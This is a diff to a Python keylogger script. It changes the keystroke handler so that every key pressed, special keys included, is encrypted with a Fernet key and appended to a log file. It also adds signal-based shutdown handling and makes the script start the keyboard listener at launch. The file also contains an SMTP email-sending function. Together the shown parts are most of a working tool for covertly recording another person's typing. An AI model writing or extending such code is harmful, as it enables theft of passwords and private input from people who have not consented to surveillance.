@@ -2,6 +2,8 @@ import os
 import sys
 import time
 import smtplib
+import signal
+import threading
 import configparser
 import logging
 from cryptography.fernet import Fernet
@@ -12,6 +14,8 @@ logging.basicConfig(
     format='%(asctime)s - %(levelname)s - %(message)s'
 )
 logger = logging.getLogger(__name__)
+# Global shutdown flag
+shutdown_flag = threading.Event()
 # Configuration management
 CONFIG_FILE = 'config.ini'
 def load_config():
@@ -74,20 +78,59 @@ def send_email(config, subject, body):
             logger.info("Email sent successfully")
     except Exception as e:
         logger.error(f"Failed to send email: {e}")
-def on_press(key):
-    """Handle key press events."""
+def on_press(key, config, cipher_suite):
+    """Handle key press events with encryption."""
     try:
-        logger.info(f"Key pressed: {key}")
+        if shutdown_flag.is_set():
+            return False  # Stop listener
+        log_file = os.path.join(
+            config['logging']['dir'],
+            config['logging']['file']
+        )
+        # Convert key to string safely
+        try:
+            key_str = str(key.char)
+        except AttributeError:
+            if key == Key.space:
+                key_str = " "
+            else:
+                key_str = f" [{key.name}] "
+        # Encrypt and log the keystroke
+        encrypted = cipher_suite.encrypt(key_str.encode())
+        with open(log_file, 'ab') as f:
+            f.write(encrypted + b'\n')
     except Exception as e:
         logger.error(f"Error handling key press: {e}")
-def start_keylogger(log_file):
-    """Start monitoring keyboard input."""
-    setup_directories(os.path.dirname(log_file))
-    with open(log_file, 'a') as f:
-        f.write(f"\n\n--- New Session {time.ctime()} ---\n\n")
-    with Listener(on_press=on_press) as listener:
-        listener.join()
+def signal_handler(sig, frame):
+    """Handle interrupt signals for graceful shutdown."""
+    logger.info("Shutdown signal received")
+    shutdown_flag.set()
+def start_keylogger(config):
+    """Start monitoring keyboard input with proper shutdown handling."""
+    try:
+        log_file = os.path.join(
+            config['logging']['dir'],
+            config['logging']['file']
+        )
+        setup_directories(os.path.dirname(log_file))
+        # Initialize encryption
+        cipher_suite = Fernet(config['encryption']['key'].encode())
+        # Register signal handlers
+        signal.signal(signal.SIGINT, signal_handler)
+        signal.signal(signal.SIGTERM, signal_handler)
+        with open(log_file, 'ab') as f:
+            f.write(f"\n\n--- New Session {time.ctime()} ---\n\n".encode())
+        logger.info("Starting keyboard listener (Press Ctrl+C to stop)")
+        with Listener(
+            on_press=lambda key: on_press(key, config, cipher_suite)
+        ) as listener:
+            while not shutdown_flag.is_set():
+                time.sleep(0.1)
+            listener.stop()
+        logger.info("Keyboard listener stopped gracefully")
+    except Exception as e:
+        logger.error(f"Error in keylogger: {e}")
+        sys.exit(1)
 if __name__ == "__main__":
     config = load_config()
-    # Example usage
-    send_email(config, "Test Subject", "This is a test email body")
+    start_keylogger(config)
